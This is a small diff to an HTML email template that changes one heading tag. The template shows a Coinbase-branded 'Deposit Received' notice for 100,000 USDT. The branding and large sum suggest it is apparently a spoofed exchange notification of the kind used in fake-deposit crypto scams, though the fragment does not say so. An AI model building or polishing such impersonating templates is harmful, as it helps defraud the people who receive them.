@@ -6,7 +6,7 @@
 <body>
 <img src="IMG_0560.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
 
-<h2 style="color:#333333; margin:0 0 10px 0; font-size:24px;">Deposit Received</h2>
+<h3 style="color:#333333; margin:0 0 10px 0; font-size:24px;">Deposit Received</h3>
     <p style="font-size:16px; color:#555555; margin:0;">You've received a deposit of</p>
     <p style="font-size:28px; color:#05a5f0; margin:20px 0;"><strong>100,000 USDT</strong></p>
 
